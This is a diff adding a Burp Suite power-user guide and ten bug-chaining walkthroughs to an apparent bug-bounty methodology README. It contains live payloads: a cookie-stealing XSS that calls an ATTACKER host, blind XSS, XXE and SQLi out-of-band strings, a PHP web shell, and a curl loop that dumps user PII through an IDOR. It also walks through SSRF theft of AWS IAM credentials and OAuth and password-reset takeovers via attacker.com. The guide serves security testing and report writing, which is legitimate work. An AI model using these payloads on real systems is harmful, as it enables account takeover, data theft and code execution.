@@ -885,6 +885,8 @@ Now that you've run through the basics, dive into the full methodology below. Ea
 | 7 | [Reporting](#7-reporting) | Professional Write-ups |
 | 8 | [Obfuscation Payloads](#8-obfuscation-payloads--universal-bypass-reference) | Encoding Reference — Quotes · Brackets · Chains |
 | 9 | [HTTP Headers](#9-http-headers-reference) | Security · Cache · CORS · Forwarding · Bypass |
+| 10 | [Burp Suite Workflow](#10-burp-suite-workflow--power-user-guide) | Settings · Repeater · Macros · Intruder · Extensions |
+| 11 | [Bug Chaining](#11-bug-chaining--from-low-to-critical) | 10 Chains · XSS→ATO · Redirect→OAuth · IDOR→Mass Data |
 
 ---
 
@@ -5565,4 +5567,337 @@ Server                   → Web server (Apache/2.4.41, nginx/1.18)
 X-AspNet-Version         → ASP.NET version
 X-Generator              → CMS (Drupal, WordPress)
 ```
-MIT License — Hack responsibly. Share knowledge. Build the community.
+
+---
+
+<br>
+
+## **10. Burp Suite Workflow — Power-User Guide**
+
+> Burp Suite is your primary weapon. These are the workflows that save hours.
+
+### **10.1 Essential Settings**
+
+```bash
+# Project Options → Sessions → Session Handling Rules
+# Add rule: "Auto-add session cookie"
+# → Scope: all URLs
+# → Actions: Add → "Use cookies from session handling cookie jar"
+# This automatically attaches your logged-in cookie to EVERY request.
+# Without this: you manually copy-paste cookies. With this: Burp handles it.
+
+# User Options → Display
+# Enable: "Repeater → Follow redirects (on-site only)"
+# Without this: you manually follow 302 redirects. Waste of time.
+
+# Proxy → Intercept
+# Set to "Intercept is off" by default. Turn on ONLY when needed.
+# Beginners leave it on → every page load gets intercepted → pain.
+```
+
+### **10.2 Repeater Power Tips**
+
+```bash
+# 1. Rename tabs with meaningful names
+# Right-click tab → Rename → "IDOR user/1→2" instead of "Repeater 47"
+
+# 2. Use the Request Inspector
+# View → Inspector (right panel)
+# Shows: headers, params, body — without scrolling through raw text
+
+# 3. Keyboard shortcuts
+# Ctrl+R = Send to Repeater
+# Ctrl+Shift+I = Send to Intruder
+# Ctrl+Space = Send request in Repeater
+
+# 4. Group tabs by target
+# Right-click → "Add to tab group"
+# Groups: "target.com", "api.target.com", "admin.target.com"
+
+# 5. Enable HTTP/2 in Repeater
+# Inspector → Request Attributes → Protocol → HTTP/2
+# Required for: HTTP/2 downgrade attacks, single-packet race conditions
+```
+
+### **10.3 Macros — Automate Multi-Step Flows**
+
+```bash
+# Problem: Testing requires login → CSRF token → use token in next request
+# Solution: Create a Macro that does this automatically
+
+# Setup:
+# 1. Project Options → Sessions → Macros → Add
+# 2. Select requests from Proxy History:
+#    - GET /login (to capture CSRF token)
+#    - POST /login (to authenticate)
+# 3. Configure parameter extraction:
+#    - Extract CSRF token from response 1
+#    - Pass it to request 2
+# 4. Session Handling Rules → Add → "Run macro"
+
+# Use case:
+# → 2FA flow: login step 1 → macro captures 2FA token → step 2 uses it
+# → CSRF-protected endpoints: macro grabs token → every request uses fresh token
+# → Password reset testing: macro gets reset token → brute forces it
+```
+
+### **10.4 Intruder — Attack Types Cheat Sheet**
+
+```bash
+# Sniper (1 payload position):
+# → Bruteforce ONE value: password, user ID, session token
+# Example: ?id=§1§ → fuzz ID from 1-100
+
+# Battering Ram (1 payload, multiple positions):
+# → Same payload inserted into ALL positions simultaneously
+# Example: username=§admin§&search=§admin§
+
+# Pitchfork (multiple payloads, 1-to-1):
+# → Payload 1 position 1 matched with Payload 1 position 2
+# Example: IP spoofing: X-Forwarded-For increment with each password attempt
+
+# Cluster Bomb (multiple payloads, all combinations):
+# → Every combination tested. SLOW. Use carefully.
+# Example: username wordlist × password wordlist = full brute force
+```
+
+### **10.5 Collaborator — Every Blind Vuln's Best Friend**
+
+```bash
+# Burp → Collaborator Client → "Copy to clipboard"
+# Paste this URL anywhere you need OOB confirmation:
+
+# Blind SSRF:
+POST /api/fetch HTTP/1.1
+{"url":"http://BURP-COLLAB.oastify.com"}
+
+# Blind XXE:
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://BURP-COLLAB.oastify.com"> %xxe;]>
+<root>test</root>
+
+# Blind XSS:
+"><script src=//BURP-COLLAB.oastify.com/xss></script>
+
+# SQLi OOB:
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml...SYSTEM "http://BURP-COLLAB.oastify.com/">...')),'/l') FROM dual--
+
+# Check for callbacks: Collaborator → "Poll now"
+# If ANY interaction appears → vulnerability confirmed!
+```
+
+### **10.6 Scope Configuration**
+
+```bash
+# Target → Site map → right-click target → "Add to scope"
+# Then: Filter → "Show only in-scope items"
+# Now: Proxy History, Site Map, Logger → only shows your target
+
+# Advanced scope:
+# Target → Scope → Include in scope: *.target.com
+# Target → Scope → Exclude from scope: *.static.target.com, *.cdn.target.com
+# This prevents Burp from filling up with useless CDN/static requests
+
+# Logger (View → Logger):
+# Captures ALL traffic even when Proxy is off
+# Search: "password", "token", "secret" → finds credentials in transit
+```
+
+### **10.7 Extensions That Save Hours**
+
+```bash
+# Install via: Extensions → BApp Store
+
+# Autorize — automatic IDOR detection
+# → Tests every request with low-privilege cookie
+# → Compares responses → highlights unauthorized access
+
+# Param Miner — discovers hidden parameters/headers
+# → Right-click request → "Guess params/headers"
+# → Finds: debug=true, X-Forwarded-Host, _method params
+
+# Turbo Intruder — single-packet race conditions
+# → Faster than Intruder for race condition testing
+# → Sends all requests in one TCP packet (HTTP/2)
+
+# Content-Type Converter — XML↔JSON body conversion
+# → Right-click → "Convert Content-Type"
+# → Automatically reformats between JSON/XML/URL-encoded
+
+# DOM Invader — DOM XSS detection
+# → Enabled on target → finds canary in DOM sinks
+# → Highlights: innerHTML, eval, document.write injection points
+```
+
+---
+
+<br>
+
+## **11. Bug Chaining — From Low to Critical**
+
+> *"One vulnerability is Medium. Two chained together is Critical."*
+
+### **11.1 XSS → Account Takeover**
+
+```text
+Chain: Stored XSS → Cookie theft → Session hijacking → ATO
+
+1. Attacker posts XSS in comment: <script>fetch('https://ATTACKER/?c='+document.cookie)</script>
+2. Admin reviews comments → XSS fires → cookie sent to attacker
+3. Attacker uses admin's cookie → gains admin access
+Impact: Low (XSS) → Critical (Admin Account Takeover)
+```
+
+### **11.2 Open Redirect → OAuth Account Takeover**
+
+```text
+Chain: Open Redirect → OAuth token theft → ATO
+
+1. Find open redirect: https://target.com/logout?redirect=https://evil.com
+2. Target uses OAuth with redirect_uri validation
+3. Send victim: https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/logout?redirect=https://attacker.com
+4. Victim logs in → OAuth redirects to target.com/logout → target.com redirects to attacker.com
+5. Auth code is sent to attacker.com (via the open redirect)
+6. Attacker exchanges auth code for access token → Account Takeover
+Impact: Medium (Open Redirect) → Critical (OAuth ATO)
+```
+
+### **11.3 IDOR → Mass Data Exposure**
+
+```text
+Chain: IDOR + lack of rate limiting → Mass data dump
+
+1. Find IDOR: GET /api/user/1/profile → shows user 1's PII
+2. No rate limit on this endpoint
+3. Script: for i in {1..100000}; do curl /api/user/$i/profile >> all_users.json; done
+4. Exfiltrated: name, email, phone, address of ALL users
+Impact: Medium (IDOR on single user) → Critical (Mass PII leak of 100K users)
+```
+
+### **11.4 CSRF → Account Takeover**
+
+```text
+Chain: CSRF (email change) + disclosed email format → ATO
+
+1. Find CSRF on email change: POST /settings/email — no CSRF token validation
+2. Discover email format: firstname.lastname@company.com (from JS or LinkedIn)
+3. Craft CSRF PoC that changes victim's email to attacker's
+4. Attacker triggers password reset → reset link sent to attacker's email
+Impact: Medium (CSRF on email change) → Critical (ATO via password reset)
+```
+
+### **11.5 Subdomain Takeover → Full XSS on Main App**
+
+```text
+Chain: Dangling CNAME → Subdomain takeover → XSS on main app
+
+1. Find dangling CNAME: cdn.target.com → cloudfront.net (unclaimed)
+2. Claim the CloudFront distribution → point to attacker's server
+3. Main app loads: <script src="https://cdn.target.com/app.js"></script>
+4. Attacker's CDN serves malicious JavaScript to EVERY user of the main app
+Impact: High (Subdomain takeover) → Critical (XSS on all users)
+```
+
+### **11.6 SSRF → Cloud Metadata → AWS Account Access**
+
+```text
+Chain: Blind SSRF → AWS IMDS → IAM credentials → AWS takeover
+
+1. Find SSRF: POST /api/webhook {"url":"http://COLLAB"} → confirmed
+2. Access AWS metadata: {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+3. Extract IAM access key, secret key, session token
+4. Configure AWS CLI with stolen credentials
+5. Run: aws s3 ls, aws ec2 describe-instances → full AWS access
+Impact: High (SSRF) → Critical (Cloud infrastructure takeover)
+```
+
+### **11.7 File Upload → LFI → RCE**
+
+```text
+Chain: File upload (no validation) + LFI → Remote Code Execution
+
+1. Upload file: avatar.php.jpg — accepted (extension check: .jpg only)
+2. Content: <?php system($_GET['cmd']); ?>
+3. Find LFI: /page?file=uploads/avatar.php.jpg
+4. Access uploaded file via LFI → PHP code executes
+Impact: Low (File upload flaw) + Low (LFI) → Critical (RCE)
+```
+
+### **11.8 Prototype Pollution → Privilege Escalation**
+
+```text
+Chain: Prototype pollution on JSON merge → isAdmin flag → Admin access
+
+1. API endpoint merges user settings JSON:
+   POST /api/user/settings {"theme":"dark","__proto__":{"isAdmin":true}}
+2. Lodash _.merge() pollutes Object.prototype.isAdmin = true
+3. All subsequent json responses include: {"isAdmin":true}
+4. Frontend checks: if (user.isAdmin) show admin panel
+Impact: Medium (Prototype pollution) → Critical (Full admin access)
+```
+
+### **11.9 Rate Limit Missing → Brute Force → ATO**
+
+```text
+Chain: No rate limit + weak password policy → Brute force → ATO
+
+1. Login endpoint has no rate limit AND no account lockout
+2. Enumerate valid usernames (error: "User not found" vs "Wrong password")
+3. Brute force with common passwords against known valid username
+4. Access admin account → full control
+Impact: Low (Missing rate limit) → Critical (Admin ATO)
+```
+
+### **11.10 Host Header Poisoning → Password Reset → ATO**
+
+```text
+Chain: Host Header Injection + Password Reset → ATO
+
+1. Password reset sends reset link via email
+2. Link is generated using Host header from request
+3. Send: POST /password-reset with Host: attacker.com
+4. Victim receives reset link: https://attacker.com/reset?token=REAL_TOKEN
+5. Attacker captures REAL_TOKEN → resets victim's password → logs in as victim
+Impact: Medium (Host header injection) → Critical (Password reset ATO)
+```
+
+### **11.11 Chaining Decision Tree**
+
+```text
+Found a vulnerability?
+├── Can you steal a token/cookie/session with it?
+│   → XSS, open redirect, dangling markup → YES → Chain to ATO
+│
+├── Can you use it to access data you shouldn't?
+│   → IDOR, SQLi, SSRF, LFI → YES → Chain to mass data exfiltration
+│
+├── Can you use it to execute code or write files?
+│   → File upload, command injection, SSTI → YES → Chain to RCE
+│
+├── Can you use it to bypass another security control?
+│   → CSRF bypasses auth, HPP bypasses WAF, Host header bypasses routing
+│   → YES → Chain the bypass with the exploit
+│
+└── Can you combine it with another finding?
+    → Low + Low = Medium, Medium + Medium = High, High + Low = Critical
+    → Always ask: "What can I chain this with?"
+```
+
+### **11.12 How to Write a Chain Report**
+
+```text
+Title: [Bug A] + [Bug B] = [Critical Impact]
+
+Structure:
+1. Bug A: What it is + where it is + PoC (screenshot)
+2. Bug B: What it is + where it is + PoC (screenshot)
+3. THE CHAIN: Step-by-step how A enables B
+4. IMPACT: What an attacker can do with both combined
+5. Why it would NOT be possible with just one of them
+
+Example title:
+"Open Redirect in /logout + OAuth misconfiguration = Account Takeover of any user"
+
+The triager needs to understand WHY the chain matters.
+One bug alone = Medium. Chained = Critical. SHOW THE DIFFERENCE.
+```
